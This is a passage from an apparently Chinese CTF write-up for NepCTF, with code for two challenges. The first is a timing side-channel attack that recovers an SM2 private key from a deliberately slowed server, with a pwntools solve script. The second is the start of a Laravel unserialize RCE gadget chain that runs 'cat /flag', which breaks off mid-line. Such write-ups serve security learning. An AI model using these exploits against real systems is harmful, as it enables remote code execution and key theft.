class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(Sign[self.para_len:<span class="number">2</span> * self.para_len], <span class="number">16</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = self.kg(s, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        P2 = self.kg(t, self.pk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == P2:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._add_point(P1, P2)</span><br><span class="line">            P1 = self._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kg</span>(<span class="params">self, k, Point</span>):</span></span><br><span class="line">        k=k%self.n</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">&#x27;%s%s&#x27;</span> % (Point, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mask_str = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len - <span class="number">1</span>):</span><br><span class="line">            mask_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        mask = <span class="built_in">int</span>(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len * <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                Temp = self._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    Temp = self._add_point(Temp, Point)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._convert_jacb_to_nor(Temp)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_double_point</span>(<span class="params">self, Point</span>):</span></span><br><span class="line">        t1=clock1()</span><br><span class="line">        l = <span class="built_in">len</span>(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; self.para_len * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == len_2:</span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                z1 = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (self.ecc_a3 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span>:</span><br><span class="line">                T4 = (T5 + ((T5 + <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)) &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(</span><br><span class="line">                    self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                T4 = (T5 + (T5 &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e7</span>):</span><br><span class="line">                sleep(<span class="number">0.01</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_point</span>(<span class="params">self, P1, P2</span>):</span></span><br><span class="line">        t1=clock1()</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P2, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        l1 = <span class="built_in">len</span>(P1)</span><br><span class="line">        l2 = <span class="built_in">len</span>(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            X1 = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = <span class="built_in">int</span>(P1[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == len_2:</span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Z1 = <span class="built_in">int</span>(P1[len_2:], <span class="number">16</span>)</span><br><span class="line">            x2 = <span class="built_in">int</span>(P2[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = <span class="built_in">int</span>(P2[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e8</span>):</span><br><span class="line">                sleep(<span class="number">0.1</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_convert_jacb_to_nor</span>(<span class="params">self, Point</span>):</span></span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        x = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line">        z_inv = <span class="built_in">pow</span>(</span><br><span class="line">            z, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span>:</span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_point</span>(<span class="params">self,P1,P2</span>):</span></span><br><span class="line">        <span class="keyword">if</span> P1==P2:</span><br><span class="line">            <span class="keyword">return</span> self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> self._convert_jacb_to_nor(self._add_point(P1,P2))</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        msg=msg.encode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">3600</span>)</span><br><span class="line">        g=ecc_table[<span class="string">&quot;g&quot;</span>]</span><br><span class="line">        O=ecc_table[<span class="string">&quot;O&quot;</span>]</span><br><span class="line">        t=[randint(<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        sk=<span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> t])</span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">&quot;system reseting...&quot;</span>)</span><br><span class="line">        sm2 = TSM2(sk)</span><br><span class="line">        self.send(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;the system is &quot;</span>+<span class="built_in">str</span>(sm2.pk))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user=<span class="built_in">int</span>(self.recv(<span class="string">&quot;plz give me your number:&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">&quot;wrong, plz try again&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t1=clock1()</span><br><span class="line">            kG=sm2.kg(sk-user,g)</span><br><span class="line">            t2=clock1()</span><br><span class="line">            self.send(<span class="string">&quot;used &quot;</span>+<span class="built_in">str</span>((t2-t1)/<span class="number">1e9</span>)+<span class="string">&quot; s&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> kG==O:</span><br><span class="line">                f=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">                flag=f.read()</span><br><span class="line">                self.send(flag)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></blockquote><p><code>TSM2</code> 类为正常SM2算法实现，只不过在加法运算 <code>_add_point()</code> 和倍乘运算 <code>_double_point()</code> 分别加了 <code>sleep()</code> 控制运算时间。</p><p><code>handle()</code> 处理函数里，给出公钥 $pk$，给100次要求输入 $u$，当满足 $(sk-u)G=O$ 时可拿flag。</p><p>要满足 $(sk-u)G=O$，只有 $sk-u=0$ 或 $sk-u=n$，由于除了公钥和运算总时间无其他输出，只能猜测出 $u=sk$。</p><p>由于 $sk$ 只有8位为1，利用运算总时间，可作为侧信道信息来测试 $sk$ 各位为1时的消耗时间，测试发现当接近正确的“1”位时，运算总时间相较相邻的两位小，那么可使用时间侧信道攻击来求解私钥 $sk$。</p><p>因尝试的总次数最多为100次，采用区间遍历法缩小尝试次数，令 $x$ 为每个区间长度，总次数 $c=\cfrac{254}{x}+8x \le 100$，$x$ 可取值4~8。</p><p>采用 $x=4$ 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;nep.lemonprefect.cn&#x27;</span>,<span class="number">31135</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">pk=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line"></span><br><span class="line">nowt = <span class="number">100000.0</span></span><br><span class="line">start = []</span><br><span class="line">startt = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">x</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;used &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">float</span>(r.recvuntil(<span class="string">&#x27; s&#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>,<span class="number">4</span>):</span><br><span class="line">    t = send(<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="built_in">print</span>(i,t)</span><br><span class="line">    <span class="keyword">if</span> t &gt; nowt:</span><br><span class="line">        start.append(i-<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(start)</span><br><span class="line">    nowt = t</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> start:</span><br><span class="line">    nowt = send(<span class="number">1</span> &lt;&lt; k)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        t = send(<span class="number">1</span> &lt;&lt; (k+<span class="number">1</span>+j))</span><br><span class="line">        <span class="keyword">if</span> t &gt; nowt <span class="keyword">and</span> k+<span class="number">1</span>+j-<span class="number">1</span> &lt;= <span class="number">254</span>:</span><br><span class="line">            ans.append(k+<span class="number">1</span>+j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">        nowt = t</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">sk = <span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">send(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h3><blockquote><p>顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了</p></blockquote><p>访问 <code>www.zip</code> 下载源码，CMS为Laravel 9.x。</p><p>在 <code>www\app\Http\Controllers</code> 发现 <code>HelloController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = base64_decode(<span class="variable">$request</span>-&gt;input(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        unserialize(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化RCE漏洞，使用现成链子可以打通：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>\<span class="title">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingResourceRegistration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registered</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$controller</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registrar=<span class="keyword">new</span> Validator();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> PendingResourceRegistration(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Validator</span>&#123;    </span><br><span class="line">        <span class="title">public</span> $<span class="title">extensions</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;extensions[<span class="string">&#x27;&#x27;</span>]=<span 